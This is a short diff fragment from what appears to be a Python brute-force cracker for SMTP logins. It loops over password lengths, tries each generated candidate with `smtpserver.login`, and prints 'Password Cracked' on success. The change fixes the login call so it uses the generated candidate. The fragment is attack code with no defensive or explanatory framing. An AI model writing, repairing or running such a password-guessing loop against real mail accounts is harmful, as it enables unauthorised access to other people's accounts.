@@ -20,7 +20,7 @@ for n in range(6, 12+1):
 
 
                try:
-                   smtpserver.login(user, perm)
+                   smtpserver.login(user, symbols)
 
                    print("[+] Password Cracked: %s") % symbols
                    break
